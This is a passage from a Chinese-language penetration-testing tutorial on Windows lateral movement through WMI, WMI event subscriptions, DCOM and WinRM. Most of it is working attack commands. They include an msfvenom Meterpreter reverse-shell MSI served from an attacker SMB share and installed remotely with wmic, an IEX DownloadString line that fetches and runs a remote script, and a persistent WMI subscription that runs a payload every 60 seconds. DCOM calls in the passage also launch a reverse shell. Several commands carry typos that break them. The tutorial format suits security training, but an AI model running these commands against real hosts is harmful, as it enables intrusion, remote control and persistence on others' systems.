cmd.exe</span><br></pre></td></tr></table></figure><p><strong>Impacket</strong>和<strong>Metasploit</strong>都内置了基于<strong>PsExec</strong>执行远程命令的脚本或模块，如<strong>Impacke</strong>中的<strong>psexec.py</strong>脚本、<strong>Metasploit</strong>中的<code>exploit/windows/smb/psexec</code>模块都可以完成相同的操作。读者可以在本地自行测试，这里不再赘述。</p><h2 id="WMI的利用"><a href="#WMI的利用" class="headerlink" title="WMI的利用"></a>WMI的利用</h2><p><strong>WMI</strong>（<strong>Windows Management Instrumentation , Windows</strong>管理规范）是一项核心的<strong>Windows</strong>管理技术。用户可以通过<strong>WMI</strong>管理本地和远程计算机。<strong>Windows</strong>为远程传输<strong>WMI</strong>数据提供了两个可用的协议，即分布式组件对象模型（<strong>Distributed Component Object Model , DCOM</strong>）和<strong>Windows</strong>远程管理（<strong>Windows Remote Management , WinRM</strong>），使得<strong>WMI</strong>对象的查询、事件注册、<strong>WMI</strong>类方法的执行和类的创建等操作都能够远程进行。<br>在横向移动时，测试人员可以利用<strong>WMI</strong>提供的管理功能，通过已v的用户凭据，与本地或远程主机进行交互，并控制其执行各种行为。目前有两种常见的利用方法：一是通过调用<strong>WMI</strong>的类进行远程执行，如<strong>Win32_Process</strong>类中的<strong>Create</strong>方法可以在远程主机上创建进程，<strong>Win32 Product</strong>类中的<strong>Install</strong>方法可以在远程主机上安装恶意的<strong>MSI</strong>，二是远程部署<strong>WMI</strong>事件订阅，在特定条的事件发生时触发攻击。<br>利用<strong>WMI</strong>进行横向移动需要具备以下条件：</p><ol><li>远程主机的<strong>WM</strong>征服务为开启状态（默认开启）；</li><li>远程主机防火墙放行<strong>135</strong>端口，这是<strong>WMI</strong>管理的默认端口。</li></ol><h4 id="常规利用方法"><a href="#常规利用方法" class="headerlink" title="常规利用方法"></a>常规利用方法</h4><p>在<strong>Windows</strong>上可以通过<strong>wmic.exe</strong>和<strong>PowerShell Cmdlet</strong>来使用<strong>WMI</strong>数据和执行<strong>WMI</strong>方法。<strong>Wmic.exe</strong>是一个与<strong>WMI</strong>进行交互的强大的命令行工具，拥有大量的<strong>WMI</strong>对象的默认别名，可以执行许多复杂的查询。<strong>Windows PowerShell</strong>也提供了许多可以与<strong>WMI</strong>进行交互的<strong>Cmdlet</strong>，如<strong>Invoke-WmiMethod</strong>、<strong>Set-WmiInstance</strong>等。</p><h5 id="1-执行远程查询"><a href="#1-执行远程查询" class="headerlink" title="1.执行远程查询"></a>1.执行远程查询</h5><p>执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.111.136 /user:Administrator /password:Admin@123 process list brief </span><br><span class="line">#/node，指定远程主机的地址；/user，指定远程主机的用户名；/password，指定用户的密码</span><br></pre></td></tr></table></figure><p>通过<strong>WMIC</strong>查询远程主机（<strong>192.168.111.136</strong>）上运行的进程信息</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127104603826.png" alt="image-20231127104603826" style="zoom:120%;"><h5 id="2-创建远程进程"><a href="#2-创建远程进程" class="headerlink" title="2.创建远程进程"></a>2.创建远程进程</h5><p>执行以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:190.168.111.136 /user:Administrator /password:Admin@123 process call create &quot;cmd.exe /c ipconfig &gt; C:\result.txt&quot;</span><br></pre></td></tr></table></figure><p>通过调用<strong>Win32_Process.Create</strong>方法在远程主机上创建进程，启动<strong>CMD</strong>来执行系统命令</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127105257089.png" alt="image-20231127105257089" style="zoom:120%;"><p>由于<strong>WMIC</strong>在执行命令时没有回显，因此可以将执行结果写入文件，然后通过建立共享连接等方式使用<strong>type</strong>命令远程读取</p><h5 id="3-远程安装MSI文件"><a href="#3-远程安装MSI文件" class="headerlink" title="3.远程安装MSI文件"></a>3.远程安装MSI文件</h5><p>通过调用<strong>Win32_Product.Install</strong>方法，可以控制远程主机安装恶意的<strong>MSI（Microsoft Installer）</strong>文件，从而获取其权限。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127105516687.png" alt="image-20231127105516687" style="zoom:120%;"><ol><li><p>使用<strong>MetaSploit</strong>生成一个恶意的<strong>MSI</strong>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 LPORT=4444 -f msi -o reverse_tcp.msi</span><br></pre></td></tr></table></figure></li><li><p>在一台测试人员可控的服务器上搭建<strong>SMB</strong>共享服务器，并将生成的<strong>MSI</strong>文件放入共享目录</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127105921853.png" alt="image-20231127105921853" style="zoom:120%;"></li><li><p>在跳板机上执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:10.10.10.19 /user:Administrator /password:Admin@123 product call install PackageLocation=&quot;\\192.168.2.143\evilsmb\reverse_tcp.msi&quot;</span><br></pre></td></tr></table></figure><p>控制远程主机（<strong>10.10.10.19</strong>），通过<strong>UNC</strong>路径进行远程加载测试人员服务器的<strong>MSI</strong>文件并进行安装，成功获取远程主机的权限。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127110246177.png" alt="image-20231127110246177" style="zoom:130%;"></li></ol><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127110308355.png" alt="image-20231127110308355" style="zoom:120%;"><h3 id="常见利用工具"><a href="#常见利用工具" class="headerlink" title="常见利用工具"></a>常见利用工具</h3><h5 id="1-Wmiexec"><a href="#1-Wmiexec" class="headerlink" title="1.Wmiexec"></a>1.Wmiexec</h5><p><strong>Impacket</strong>项目的<strong>wmiexec.py</strong>能够以全交互或半交互的方式，通过<strong>WMI</strong>在远程主机上执行命令。注意，该工具需要远程主机开启<strong>135</strong>和<strong>445</strong>端口，其中<strong>445</strong>端口用于传输命令执行的回显。<br>执行以下命令，获取远程主机的交互式命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py HACK-MY/Administrator:Admin\@123@10.10.10.19</span><br><span class="line"># python wmiexec.py &lt;Domain&gt;/&lt;Username&gt;:&lt;Password&gt;@&lt;IP&gt;</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127111115193.png" alt="image-20231127111115193" style="zoom:130%;"><p>如果是在<strong>Windows</strong>平台上使用，可以通过<strong>PyInstaller</strong>，将<strong>wmiexec.py</strong>打包成独立的<strong>exe</strong>可执行文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 安装PyInstaller模块</span><br><span class="line">pip3 Install pyinstaller</span><br><span class="line"># 进入wmiexec.py所在目录并执行打包操作，将在dist目录中生成wmiexec,exe </span><br><span class="line">cd impacket\examples </span><br><span class="line">pyinstaller -F wmiexec.py</span><br></pre></td></tr></table></figure><p>打包完成后，生成的<strong>wmiexec.exe</strong>可直接上传到<strong>Windows</strong>主机中运行，使用方法与原来的<strong>wmiexec.py</strong>相同，结果如图5-6-8所示</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127111755713.png" alt="image-20231127111755713" style="zoom:130%;"><h5 id="2-Invoke-WmiCommand"><a href="#2-Invoke-WmiCommand" class="headerlink" title="2.Invoke-WmiCommand"></a>2.Invoke-WmiCommand</h5><p><strong>Invoke-WmiCommand.ps1 <strong>是 <strong>PowerSploit <strong>项目中的一个脚本，可以通过</strong>PowerShell</strong>调用</strong>WMI</strong>来远程执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 远程加载Invoke-WmiCommand.ps1脚本</span><br><span class="line">IEX(New-object Net.Webclient).Downloadstring(&#x27;http://IP:Port/Invoke-WmiCommand.ps1&#x27;)</span><br><span class="line"># 指定远程系统用户名</span><br><span class="line">$User = &quot;HACK-MY\Administrator&quot;</span><br><span class="line"># 指定用户的密码</span><br><span class="line">$Password = ConvertTo-SecureString -String &quot;Admin@123&quot; -AsPlainText -Force</span><br><span class="line"># 将用户名和密码整合，以便导入Credential </span><br><span class="line">$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password</span><br><span class="line"># 指定远程主机的IP和要执行的命令</span><br><span class="line">$Remote = Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName &quot;10.10.10.19&quot;</span><br><span class="line"># 输出命令执行回显</span><br><span class="line">$Remote.PayloadOutput</span><br></pre></td></tr></table></figure><p>执行成功后，可以得到结果回显</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127170101806.png" alt="image-20231127170101806" style="zoom:120%;"><p>此外，<strong>PowerShell</strong>内置的<strong>Invoke-WMIMethod</strong>也可以在远程系统中执行命令或程序，但是没有执行回显。具体使用方法请读者自行查阅相关资料。</p><h4 id="WMI事件订阅的利用"><a href="#WMI事件订阅的利用" class="headerlink" title="WMI事件订阅的利用"></a>WMI事件订阅的利用</h4><p><strong>WMI</strong>提供了强大的事件处理系统，几乎可以用于对操作系统上发生的任何事件做出响应。例如，当创建某进程时，通过<strong>WMI</strong>事件订阅来执行预先设置的脚本。其中，触发事件的具体条件被称为“事件过滤器”（<strong>Event Filter</strong>），如用户登录、新进程创建等，对指定事件发生做出的响应被称为“事件消费者”（<strong>Event Consumer</strong>），包括一系列具体的操作，如运行脚本、记录日志、发送邮件等。在部署事件订阅时，需要分别构建<strong>Filter</strong>和<strong>Consumer</strong>两部分，并将二者绑定在一起。<br>所有的事件过滤器都被存储为一个<code>ROOT\subscription:__EventFilter</code>对象的实例，可以通过创建<code>__EventFilter</code>对象实例来部署事件过滤器。事件消费者是基于<code>ROOT\subscription:__EventConsumer</code>系统类派生来的类。系统提供了常用的标准事件消费类，如需了解更多细节，读者可以查阅微软提供的相关文档。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127171329285.png" alt="image-20231127171329285" style="zoom:120%;"><p>测试人员可以使用<strong>WMI</strong>的功能在远程主机上部署永久事件订阅，并在特定事件发生时执行任意代码或系统命令。使用<strong>WMI</strong>事件消费类的<strong>ActiveScriptEventConsumer</strong>和<strong>CommandLineEventConsumer</strong>，可以在远程主机上执行任何攻击载荷。该技术主要用来在目标系统上完成权限持久化，亦可用于横向移动，并且需要提供远程主机的管理员权限的用户凭据。</p><h5 id="1-手动利用"><a href="#1-手动利用" class="headerlink" title="1.手动利用"></a>1.手动利用</h5><p>下面通过手动执行<strong>PowerShell</strong>命令来讲解利用工程</p><ol><li><p>整合<strong>PSCredentical</strong>，用于后续过程认证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$Username = &quot;HACK-MY\Administrator&quot;</span><br><span class="line">$Password = &quot;Admin@123&quot;</span><br><span class="line">$SecurePassword = $Password | ConvertTo-SecureString -AsPlainText -Force</span><br><span class="line">$Credential = New-object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword</span><br></pre></td></tr></table></figure></li><li><p>设置攻击目标和其他公共参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$GlobalArgs=e@&#123;&#125;</span><br><span class="line">$ComputerName = &quot;10.10.10.19&quot;</span><br><span class="line">$GlobalArgs[&#x27;Credential&#x27;]= $Credential</span><br><span class="line">$GlobalArgs[&#x27;ComputerName&#x27;] = $ComputerName</span><br></pre></td></tr></table></figure></li><li><p>在远程主机（<strong>10.10.10.19</strong>）上部署“<strong>TestFilter</strong>”事件过滤器，用于查询<strong>svchost.exe</strong>进程的产生。由于<strong>WMI</strong>所有的事件过滤器都被存储为<strong>ROOT\subscription:__EventFilter</strong>对象的实例，因此通过<strong>Set-WmiInstance Cmdlet</strong>创建一个**__EventFilter**类的实例即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$EventFilterArgs = @&#123;</span><br><span class="line">EventNamespace = &#x27;root/cimv2&#x27;</span><br><span class="line">Name = &quot;TestFilter&quot;</span><br><span class="line">Query = &quot;SELECT * FROM Win32_ProcessStartTrace where processname =&#x27;svchost.exe&#x27;&quot;</span><br><span class="line">QueryLanguage = &#x27;WQL&#x27;</span><br><span class="line">&#125;</span><br><span class="line">$EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $EventFilterArgs @GlobalArgs</span><br></pre></td></tr></table></figure></li><li><p>在远程主机上部署一个名为<strong>TestConsumer</strong>的事件消费者，创建事件消费类<strong>CommandLineEventConsumer</strong>的实例，在指定事件发生时执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$CommandLineEventConsumerArgs = @&#123;</span><br><span class="line">Name = &quot;TestConsumer&quot;</span><br><span class="line">CommandLineTemplate = &quot;C：\Windows\System32\cmd.exe /c calc.exe&quot;</span><br><span class="line">&#125;</span><br><span class="line">$EventConsumer = Set-WmiInstance -Namespace root\subscription -class </span><br><span class="line">CommandLineEventConsumer -Arguments $CommandLineEventConsumerArgs @GlobalArgs</span><br></pre></td></tr></table></figure></li><li><p>将创建的事件过滤器和事件消费者绑定在一起</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$FilterConsumerBindingArgs = @&#123;</span><br><span class="line">Filter $EventFilter </span><br><span class="line">Consumer = $EventConsumer</span><br><span class="line">&#125;</span><br><span class="line">$FilterConsumerBinding = Set-WmiInstance -Namespace root\subscription -class</span><br><span class="line">__FilterToConsumerBinding -Arguments $FilterConsumerBindingArgs @GlobalArgs</span><br></pre></td></tr></table></figure><p>到此，已经成功在远程主机（<strong>10.10.10.19</strong>）上部署了一个事件订阅，当远程系统轮询到<strong>svchost.exe</strong>进程产生时，将通过事件消费者执行系统命令来启动<strong>calc.exe</strong>进程。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127173914387.png" alt="image-20231127173914387" style="zoom:130%;"></li></ol><h5 id="2-Sharp-WMIEvent"><a href="#2-Sharp-WMIEvent" class="headerlink" title="2.Sharp-WMIEvent"></a>2.Sharp-WMIEvent</h5><p>完整的利用过程可以整合为<strong>PowerShell</strong>脚本（<strong>Sharp-WMIEvent</strong>，见Github的相关网页），下面简单演示使用方法。</p><ol><li><p>在一台测试人员可控的服务器上搭建<strong>SMB</strong>共享服务器，并将生成的攻击载荷放入共享目录</p></li><li><p>在跳板机上执行以下命令，运行<strong>Sharp-WMIEvent</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -ComputerName 10.10.10.19 -Domain hack-my.com -Username Administrator -Password Admin@123 -Command &quot;cmd.exe /c \\10.10.10.147\evilsmb\reverse_tcp.exe&quot;</span><br></pre></td></tr></table></figure><p>这将在远程主机上部署一个随机命名的永久事件订阅，并每隔60秒执行一次<strong>SMB</strong>共享中的攻击载荷，使远程主机上线。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127203758369.png" alt="image-20231127203758369" style="zoom:120%;"></li></ol><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127203823306.png" alt="image-20231127203823306" style="zoom:120%;"><h2 id="DCOM的利用"><a href="#DCOM的利用" class="headerlink" title="DCOM的利用"></a>DCOM的利用</h2><h3 id="COM和DCOM"><a href="#COM和DCOM" class="headerlink" title="COM和DCOM"></a>COM和DCOM</h3><h5 id="1-com"><a href="#1-com" class="headerlink" title="1.com"></a>1.com</h5><p><strong>COM</strong>（<strong>Component Object Model</strong>，组件对象模型）是微软的一套软件组件的二进制接口标准，使得跨编程语言的进程间通信、动态对象创建成为可能。<strong>COM</strong>是多项微软技术与框架的基础，包括<strong>OLE</strong>、<strong>OLE</strong>自动化、<strong>ActiveX</strong>、<strong>COM</strong>+、<strong>DCOM</strong>、<strong>Windows Shell</strong>, <strong>DirectX</strong>、<strong>Windows Runtime</strong>。</p><p><strong>COM</strong>由一组构造规范和组件对象库组成。<strong>COM</strong>组件对象通过接口来描述自身，组件提供的所有服务都通过其接口公开。接口被定义为“在对象上实现的一组语义上相关的功能”，实质是一组函数指针表。每个指针必须初始化指向某个具体的函数体，一个组件对象实现的接口数量没有限制。<strong>COM</strong>指定了一个对象模型和编程要求，使<strong>COM</strong>对象能够与其他对象交互。这些对象可以在单个进程中，也可以在其他进程中，甚至可以在远程计算机上。<br>在<strong>Windows</strong>中，每个<strong>COM</strong>对象都由唯一的<strong>128</strong>位的二进制标识符标识，即<strong>GUID</strong>。<br>当<strong>GUID</strong>用于标识<strong>COM</strong>对象时，被称为<strong>CLSID</strong>（类标识符），当它用于标识接口时，被称为<strong>IID</strong>（接口标识符）。一些<strong>CLSID</strong>还具有<strong>ProgID</strong>，方便人们记忆。</p><h5 id="2-DCOM"><a href="#2-DCOM" class="headerlink" title="2.DCOM"></a>2.DCOM</h5><p><strong>DCOM</strong>（<strong>Distributed Component Object Model</strong>，分布式组件对象模型）是微软基于组件对象模型（<strong>COM</strong>）的一系列概念和程序接口，支持不同机器上的组件间的通信。利用<strong>DCOM</strong>，客户端程序对象能够请求来自网络中另一台计算机上的服务器程序对象。<br><strong>DCOM</strong>是<strong>COM</strong>的扩展，允许应用程序实例化和访问远程计算机上的<strong>COM</strong>对象的属性和方法。<strong>DCOM</strong>使用远程过程调用（<strong>RPC</strong>）技术将组件对象模型（<strong>COM</strong>）的功能扩展到本地计算机之外，因此，在远程系统上托管<strong>COM</strong>服务器端的软件（通常在<strong>DLL</strong>或<strong>EXE</strong>中）可以通过<strong>RPC</strong>向客户端公开其方法</p><h3 id="通过DCOM横向移动"><a href="#通过DCOM横向移动" class="headerlink" title="通过DCOM横向移动"></a>通过DCOM横向移动</h3><p>部分<strong>DCOM</strong>组件公开的接口中可能包含不安全的方法。例如，<strong>MMC20.Application</strong>提供的<strong>ExecuteShellCommand</strong>方法可以在单独的进程中运行指定的程序或命令。<br>执行以下命令，可以列出计算机上所有的<strong>DCOM</strong>程序组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance Win32_DCOMApplication</span><br></pre></td></tr></table></figure><p>测试人员可以枚举包含不安全方法的其他<strong>DCOM</strong>对象，并与远程计算机的<strong>DCOM</strong>进行交互，从而实现远程执行。注意需要具备以下条件：拥有管理员权限的<strong>PowerShell</strong>，远程主机未开启防火墙。<br>目前经常利用的<strong>DCOM</strong>组件有<strong>MMC20.Application</strong>、<strong>ShellWindows</strong>、<strong>Excel.Application</strong>、 <strong>ShellBrowserWindow</strong>等，下面简要介绍。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127211121076.png" alt="image-20231127211121076" style="zoom:80%;"><h5 id="1-MMC20-Application"><a href="#1-MMC20-Application" class="headerlink" title="1.MMC20.Application"></a>1.MMC20.Application</h5><p><strong>MMC20.Application</strong>对象的<strong>Document.ActiveView</strong>下存在一个<strong>ExecuteShellCommand</strong>方法，可以用来启动子进程并运行执行的程序或系统命令</p><p>下面以<strong>MMC20.Application</strong>组件为例，在远程主机上执行攻击载荷，并上线<strong>Meterpreter</strong>。</p><ol><li><p>在一台可控的服务器上搭建SMB匿名共享服务，并将生成的攻击载荷放入共享目录，相关操作请参考前文。</p></li><li><p>在管理员权限的<strong>PowerShell</strong>中执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 通过ProgID与DCOM进行远程交互，并创建MMC20.Application对象的实例</span><br><span class="line">$com</span><br><span class="line">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;10.10.10.19&quot;)</span><br><span class="line"># 调用ExecuteShellCommand方法启动进程，以运行攻击载荷</span><br><span class="line">$com.Document.Activeview.ExecuteshellCommand(&#x27;cmd.exe&#x27;,$null,&quot;/c \\192.168.2.143\evilsmb\ reverse_tcp.exe&quot;, &quot;Minimized&quot;)</span><br></pre></td></tr></table></figure><p>通过<strong>MMC20.Application</strong>在远程主机（<strong>10.10.10.19</strong>）上启动进程，加载<strong>SMB</strong>共享中的攻击载荷并执行。图5-7-3表示远程主机成功上线。<br>在调用过程中，<strong>MMC20.Application</strong>会启动<strong>mmc.exe</strong>进程，通过<strong>ExecuteShellCommand</strong>方法在<strong>mmc.exe</strong>中创建子进程，如图5-7-4所示，适用于<strong>Windows7</strong>及以上版本的系统。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127214507684.png" alt="image-20231127214507684" style="zoom:130%;"><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127214536758.png" alt="image-20231127214536758" style="zoom:130%;"></li></ol><h5 id="2-ShellWindows"><a href="#2-ShellWindows" class="headerlink" title="2.ShellWindows"></a>2.ShellWindows</h5><p><strong>ShellWindows</strong>组件提供了<strong>Document.Application.ShellExecute</strong>方法，如图5-7-5所示，可以启动子进程来运行指定的程序或系统命令，适用于<strong>Windows7</strong>及以上版本的系统。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127214710780.png" alt="image-20231127214710780" style="zoom:120%;"><p>由于<strong>ShellWindows</strong>对象没有<strong>ProgID</strong>，因此需要使用其<strong>CLSID</strong>来创建实例。通过<strong>OleViewDotNet</strong>，可以找到<strong>ShellWindows</strong>对象的<strong>CLSID</strong>为<strong>9BA05972-F6A8-11CF-A442-00A0C90A8F39</strong>，如图5-7-6所示。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127214854720.png" alt="image-20231127214854720" style="zoom:130%;"><p>在管理员权限的<strong>PowerShell</strong>中执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 通过CLSID与DCOM进行远程交互，并创建ShellWindows对象的实例</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$com = [Activator]:CreateInstance([Type]::GetTypeFromCLSID(&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;,&quot;10,10,10.19&quot;)</span><br><span class="line"># 调用ShellExecute方法启动子进程</span><br><span class="line">$com.item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;C：\Windows\</span><br><span class="line">System32&quot;,$null,0)</span><br></pre></td></tr></table></figure><p>即可通过<strong>ShellWindows</strong>在远程主机（<strong>10.10.10.19</strong>）上启动<strong>calc.exe</strong>。注意，<strong>ShellWindows</strong>并不会创建新进程，而是在已有<strong>explorer.exe</strong>进程中创建并执行子进程，如图5-7-7所示。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127215638847.png" alt="image-20231127215638847" style="zoom:120%;"><h5 id="3-ShellBrowserWindow"><a href="#3-ShellBrowserWindow" class="headerlink" title="3.ShellBrowserWindow"></a>3.ShellBrowserWindow</h5><p><strong>ShellBrowserWindow</strong>中也存在一个<strong>Document.Application.ShellExecute</strong>方法，与<strong>ShellWindows</strong>一样，但不会创建新进程，而是通过已有的<strong>explorer.exe</strong>来托管子进程。该方法只适用于<strong>Windows 10</strong>和<strong>Windows Server2012</strong>等版本的系统，利用方法如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 通过CLSID与DCOM进行远程交互，并创建ShellBrowserwindow对象的实例</span><br><span class="line">$com =[Activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-</span><br><span class="line">8455-00A0C91F3880&quot;,&quot;10.10.10.13&quot;)</span><br><span class="line"># 调用ShellExecute方法启动子进程</span><br><span class="line">$com.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;C:\Windows\System32&quot;,$null,0)</span><br></pre></td></tr></table></figure><h2 id="WinRM的利用"><a href="#WinRM的利用" class="headerlink" title="WinRM的利用?"></a>WinRM的利用?</h2><p><strong>WinRM</strong>是通过执行<strong>WS-Management</strong>协议（用于远程软件和硬件管理的Web服务协议）来实现远程管理的，允许处于一个共同网络内的<strong>Windows</strong>计算机彼此之间互相访问和交换信息，对应的端口是<strong>5985</strong>。在一台计算机启用<strong>WinRM</strong>服务后，防火墙会自动放行其相关通信端口，另一台计算机便能通过WiRM对其进行远程管理了。<br>注意，只有在<strong>Windows Server2008</strong>以上版本的服务器中，<strong>WinRM</strong>服务才会自动启动。测试人员通过<strong>WinRM</strong>服务进行横向移动时，需要拥有远程主机的管理员凭据信息。</p><p><strong>利用条件：</strong></p><p><strong>WinRS</strong> 适用于 <strong>Win server 2008 &#x2F; Win7</strong> 及以后的系统，但是 <strong>Win server 2008 &#x2F; PC</strong> 全版本系统默认关闭。</p><p>只有在<strong>Win server 2012</strong> 之后的版本的<strong>WinRM</strong>服务才默认启动并监听了<strong>5985</strong>端口，允许远程任意主机来管理。</p><p>执行以下命令查询<strong>WinRM</strong>状态：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Get-WmiObject -Class win32_service | Where-Object &#123;$_.name -like &quot;WinRM&quot;&#125;</span><br></pre></td></tr></table></figure><h3 id="通过WinRM执行远程命令"><a href="#通过WinRM执行远程命令" class="headerlink" title="通过WinRM执行远程命令"></a>通过WinRM执行远程命令</h3><p><strong>Windows</strong>远程管理提供了以下两个命令行工具：</p><ol><li><strong>Winrs</strong>，允许远程执行命令的命令行工具，利用<strong>WS-Management</strong>协议</li><li><strong>Winrm (Winrm.cmd)<strong>，内置系统管理命令行工具，允许管理员配置本机的</strong>WinRM</strong>服务。</li></ol><p>注意，在默认情况下，无法通过<strong>WinRM</strong>连接到目标系统。在首次使用这些工具进行<strong>WinRM</strong>连接时，可能出现提示以下错误：<strong>Winrs error: WinRM</strong>客户端无法处理该请求。<br>在下列条件下，可以将默认身份验证与IP地址结合使用：</p><ol><li>传输为<strong>HTTPS</strong>或目标位于<strong>TrustedHosts</strong>列表中，并且提供了显式凭据</li><li>使用<strong>Winrm.cmd</strong>配置<strong>TrustedHosts</strong>。注意，<strong>TrustedHosts</strong>列表中的计算机可能未经过身份验证。有关如何设置<strong>TrustedHosts</strong>的详细信息，可以通过运行<code>winrm help config</code>命令来了解。</li></ol><p>执行以下命令，手动将目标的IP地址添加到客户端的信任列表（<strong>TrustedHosts</strong>）中如图5-8-1所示。也可以将<strong>TrustedHosts</strong>设置为<code>*</code>，从而信任所有主机。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">winrm set winrm/config/client 